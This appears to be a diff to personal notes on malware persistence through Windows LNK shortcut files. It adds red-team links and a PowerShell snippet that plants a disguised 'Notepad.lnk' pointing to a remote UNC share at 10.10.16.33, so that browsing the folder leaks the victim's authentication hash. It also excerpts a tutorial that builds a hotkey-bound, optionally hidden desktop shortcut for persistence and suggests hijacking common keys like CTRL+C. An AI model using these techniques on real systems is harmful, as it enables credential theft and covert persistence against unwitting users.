@@ -3,7 +3,25 @@
 #
 https://cocomelonc.github.io/persistence/2023/12/10/malware-pers-23.html
 #
+https://github.com/dievus/lnkbomb
+#
+https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence
+#
 ##
+
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\Common Applications\Notepad.lnk")
+$lnk.TargetPath = "\\10.10.16.33\test"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+
+
+
 
 Malware development: persistence - part 23. LNK files. Simple Powershell example.
 
@@ -40,7 +58,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 }
 
 And then, just create powershell script for create LNK file with the following properties:
-
+```
 # Define the path for the shortcut on the desktop
 $shortcutPath = "$([Environment]::GetFolderPath('Desktop'))\Meow.lnk"
 
@@ -74,6 +92,7 @@ $shortcut.Save()
 
 # Optionally make the link invisible by adding 'Hidden' attribute
 # (Get-Item $shortcutPath).Attributes += 'Hidden'
+```
 
 As you can see, the logic is pretty simple. We simply create a shortcut on the desktop that has a hotkey specified: CTRL+W. Of course, in real attack scenarios it could be something like CTRL+C, CTRL+V or CTRL+P, etc.
 
